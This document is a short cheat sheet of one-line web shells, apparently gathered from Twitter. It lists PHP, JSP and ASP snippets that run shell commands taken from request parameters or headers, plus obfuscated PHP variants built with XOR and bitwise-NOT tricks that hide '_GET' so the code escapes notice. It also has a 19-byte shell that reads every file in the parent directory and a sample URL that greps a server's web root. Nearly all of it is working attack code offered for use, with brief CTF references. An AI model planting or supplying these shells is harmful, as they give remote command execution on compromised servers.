# oneliner-webshell

### Source: Twitter

#PHP

```
<?php system($_REQUEST["cmd"]); ?>
<?php system($_GET["cmd"]); ?>
<?php
system("uname -a");
?>
<?=`$_GET[1]`?>
<?=`$_GET[1]`;
```

```
<?=`{${~"����"}[_]}`;
// echo -ne '<?=`{${~"\xa0\xb8\xba\xab"}[_]}`;'
19 bytes (cat all files from ../)
<?=`/???/??? ../*`;
```

```
<?=$_='$<>/'^'{{{{';${$_}[_](${$_}[__]);

// $_= '$<>/' ^ '{{{{' ----> $_ = '_GET'
// ${_GET}[_](${_GET})[__];
// final <?=$_GET[_]($_GET[__])
And then after visiting the URL http://138.68.228.12/alien_message/super_secret_shell.php?_=system&__=rgrep MeePwn /var/www/
```

```
<?=`{${~"\xa0\xb8\xba\xab"}["\xa0"]}`;

/*
 *   In terminal:
 *       $ echo -ne '<?=`{${~\xa0\xb8\xba\xab}[\xa0]}`;' > rev_shell.php
 *   This is how the code will be produced, \xa0\xb8\xba\xab will be 
 *   treated as constant therefore no " needed. It is also not copyable
 *   string because of non-ascii characters
 *
 *   Explanation:
 *      - ~"\xa0\xb8\xba\xab" <-> "_GET"
 *      - ${"_GET"}["\xa0"] <-> $_GET["\xa0"]
 *      - `{$_GET["\xa0"]}` <-> shell_exec($_GET["\xa0"])
 *
 *   This is only 5 bytes longer than the shortest PHP shell (using $_GET to smuggle data)! 
 *   <?=`$_GET[_]`;
 *   
 *   This is a slightly improved idea that I had 2 years ago
 *   https://github.com/terjanq/Flag-Capture/blob/master/MeePwn%202018/omega/README.md#part2
 */
```

```
<?=`{$_GET[_]}`; (16 bytes) PHP shell is not the shortest. Can do without {} The shortest is <?=`$_GET[_]`; (14 bytes) if short_open_tag: Off and <?`$_GET[_]`; (13 bytes) if short_open_tag: On
```

#JSP

```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
<%Runtime.getRuntime().exec(request.getHeader("c"));%>
```

#ASP

```
<% eval request("cmd") %>
```
